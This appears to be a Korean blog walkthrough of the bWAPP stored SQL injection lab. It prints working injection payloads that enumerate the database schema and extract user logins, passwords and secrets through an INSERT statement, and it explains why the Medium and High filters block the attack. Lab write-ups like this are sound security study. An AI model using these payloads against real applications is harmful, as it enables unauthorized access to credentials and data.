---
layout: single
title: (bWAPP)SQL Injection - Stored (Blog)
categories: Web-vuln
tag: [sql injection, sql, injection, bwapp, bee box, GET, OWASP TOP 10, OWASP]
toc: true
author_profile: false
---

# 검증 로직
> Low Level 에서는 보안 대책이 적용되어 있지 않다.

## Level - Low

![그림 1-1](/assets/image/bwapp/injection/SQLI-Stored-Blog-archive/image.png)
- 사용자의 입력값이 DB 에 저장된 후 불러와 다시금 출력하는 듯 하다.

![그림 1-2](/assets/image/bwapp/injection/SQLI-Stored-Blog-archive/image2.png)
- 사용자의 입력값이 Entry에 입력되는 걸 확인 할 수 있다.
- 이럴 경우 보통 XSS 공격만 테스트 하고 넘어가는 경우가 많다.
- 하지만 DB에 저장된 값을 SQL 구문을 통해 불러오거나 저장하는 경우 SQL Injection도 충분히 일어날 수 있다.

![그림 1-3](/assets/image/bwapp/injection/SQLI-Stored-Blog-archive/image3.png)
- ‘(싱글쿼터) 입력시 DBMS Error가 발생하는 것을 볼 수 있다.

```sql
$sql = "INSERT INTO blog (date, entry, owner) VALUES (now(),'" . $entry . "','" . $owner . "')";
```

> INSERT 절을 통해 입력 되는 SQL 구문은 위와 같다.

```sql
test',select(select 1))--
```

![그림 1-4](/assets/image/bwapp/injection/SQLI-Stored-Blog-archive/image4.png)
- select 1 을 사용하여 테스트 해본 결과 1이 정상적으로 출력되고 있다.

```sql
test',(select schema_name from information_schema.schemata limit 1,1))--
```

![그림 1-5](/assets/image/bwapp/injection/SQLI-Stored-Blog-archive/image5.png)
- Union Based를 사용하여 bWAPP 데이터베이스를 확인했다. 이와 같이 INSERT 절에 중첩SELECT절을 사용하여 공격을 진행할 수 있다.

```sql
test',(select table_name from information_schema.tables where table_schema='bWAPP' limit 3,1))--
```

![그림 1-6](/assets/image/bwapp/injection/SQLI-Stored-Blog-archive/image6.png)
- users 라는 테이블도 확인했다.

```sql
test',(select column_name from information_schema.columns where table_schema='bWAPP' and table_name='users' limit 1,1))--
```

![그림 1-7](assets/image/bwapp/injection/SQLI-Stored-Blog-archive/image7.png)
- 각각의 컬럼명도 획득할 수 있다.

```sql
test',(select concat(login,0x3a,id,0x3a,password,0x3a,secret) from bWAPP.users limit 1,1))--
```

![그림 1-8](assets/image/bwapp/injection/SQLI-Stored-Blog-archive/image8.png)
- 데이터 추출에 성공했다.

## Medium & High

```php
function sqli_check_1($data)
{
    return addslashes($data)
}

function sqli_check_2($data)
{
    return mysql_real_escape_string($data);
}
```

1. Medium Level 에서는 addslahes() 함수를 사용하여 ‘(싱글쿼터 )를 입력하게되면 \ 를 앞에 붙여 ‘(싱글쿼터) 사용을 막고 있다. 해당 search 구문인 ‘%%’ 로 이루어져 있어 공격이 성립되지 않는다.
2. High Level 에서는 mysql_real_escape_string() 함수를 사용하여 메타문자를 방지하고 있다.
3. 해당 문제에서 Medium 과 High Level은 공격이 성립되지 않는다.
